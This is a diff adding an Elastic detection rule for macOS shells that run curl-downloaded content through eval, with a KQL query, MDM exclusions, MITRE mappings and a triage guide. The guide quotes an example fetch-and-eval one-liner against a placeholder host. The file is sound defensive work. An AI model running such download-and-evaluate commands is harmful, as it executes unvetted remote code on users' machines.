@@ -1,0 +1,110 @@
+[metadata]
+creation_date = "2026/11/09"
+integration = ["endpoint"]
+maturity = "production"
+updated_date = "2026/11/10"
+
+[rule]
+author = ["Elastic"]
+description = """
+Detects a shell that downloads content with curl and passes it to eval, either directly or through a variable
+assignment. Downloading a script and evaluating it in memory avoids writing the payload to disk and is commonly used
+by macOS loaders, adware and infostealer stagers to retrieve and run their next stage.
+"""
+from = "now-9m"
+index = ["logs-endpoint.events.process-*"]
+language = "kuery"
+license = "Elastic License v2"
+name = "Shell Evaluated Curl Downloaded Content"
+note = """## Triage and analysis
+
+### Investigating Shell Evaluated Curl Downloaded Content
+
+Download-and-evaluate one-liners such as `x=$(curl -fsSL https://host/stage2); eval "$x"` fetch a remote script and run it directly in the shell's memory, leaving no payload on disk. macOS loaders and stagers (for example WizardUpdate/UpdateAgent, adware droppers and infostealer installers) use this pattern to pull their next stage. Developer tooling, AI coding agents and management agents also assign curl output to variables and evaluate shell content. Common agent shell wrappers and vendor-signed MDM agents are excluded by the query.
+
+### Possible investigation steps
+
+- Review `process.command_line` to identify the URL being retrieved and whether the evaluated content comes directly from curl or from a variable populated by curl.
+- Examine `process.parent.executable`, `process.parent.command_line` and `process.Ext.effective_parent.executable` to determine what launched the shell (an application, a LaunchAgent/LaunchDaemon via launchd, an interactive terminal, or an automation tool).
+- Check the reputation of the domain or IP in the curl request, and whether it is a raw IP, newly registered domain, paste site or file-sharing service.
+- Look for follow-on activity from the same shell or its children: additional downloads, `xattr` quarantine removal, LaunchAgent/LaunchDaemon creation, osascript prompts, or credential and browser data access.
+- Determine whether the same command or URL has executed on other hosts, which may indicate a broader campaign or a shared legitimate internal script.
+
+### False positive analysis
+
+- Internal administration or patching scripts may retrieve configuration with curl and evaluate it. Confirm the script source and URL, then add an exception for the specific parent executable or script path.
+- Developer tooling and AI coding agents may assign curl output to variables and evaluate shell content while testing APIs. Common agent shell wrappers and vendor-signed MDM agents are excluded by the query.
+- Installers that bootstrap themselves from a vendor URL may trigger the rule. Validate the domain and add an exception for the vendor URL pattern if appropriate.
+
+### Response and remediation
+
+- If the activity is malicious, isolate the host and retrieve the evaluated content by requesting the URL from an isolated analysis environment.
+- Terminate the shell and any child processes, and remove persistence (LaunchAgents, LaunchDaemons, login items) created around the time of execution.
+- Block the remote domain or IP at the network perimeter and search for other hosts that contacted it.
+- Review and rotate credentials that may have been exposed if follow-on credential or browser data access is observed.
+"""
+references = [
+    "https://www.microsoft.com/security/blog/2022/02/02/the-evolution-of-a-mac-trojan-updateagents-progression/",
+]
+risk_score = 47
+rule_id = "a7db8a6b-723f-405d-bd3b-2e769e5a0745"
+severity = "medium"
+tags = [
+    "Domain: Endpoint",
+    "OS: macOS",
+    "Use Case: Threat Detection",
+    "Tactic: Execution",
+    "Tactic: Command and Control",
+    "Data Source: Elastic Defend",
+    "Resources: Investigation Guide",
+    "Rule Type: Custom Query (KQL)",
+    "Platform: macOS",
+]
+timestamp_override = "event.ingested"
+type = "query"
+
+query = '''
+event.category:process and host.os.type:macos and event.type:start and event.action:exec and
+process.name:(bash or dash or sh or zsh or ksh) and process.args:"-c" and
+process.command_line:(*=$\(curl*eval* or *eval*$\(curl* or *=`curl*eval* or *eval*`curl*) and
+not process.Ext.effective_parent.executable:(
+  "/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon" or
+  "/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfManagementService.app/Contents/MacOS/JamfManagementService" or
+  "/Library/Application Support/Mosyle/MosyleMDM.app/Contents/MacOS/MosyleMDM"
+) and
+not (process.parent.code_signature.trusted:true and process.parent.code_signature.team_id:(
+  UBF8T346G9 or VDXQ22DGB9 or Q6L2SF6YDW or 2DC432GLL2 or
+  483DWKW443 or 5NZ4Q7NXJ4 or PZT9BJUAA5 or 5Y6N3AJ54S
+))
+'''
+
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1059"
+name = "Command and Scripting Interpreter"
+reference = "https://attack.mitre.org/techniques/T1059/"
+[[rule.threat.technique.subtechnique]]
+id = "T1059.004"
+name = "Unix Shell"
+reference = "https://attack.mitre.org/techniques/T1059/004/"
+
+
+
+[rule.threat.tactic]
+id = "TA0002"
+name = "Execution"
+reference = "https://attack.mitre.org/tactics/TA0002/"
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1105"
+name = "Ingress Tool Transfer"
+reference = "https://attack.mitre.org/techniques/T1105/"
+
+
+[rule.threat.tactic]
+id = "TA0011"
+name = "Command and Control"
+reference = "https://attack.mitre.org/tactics/TA0011/"
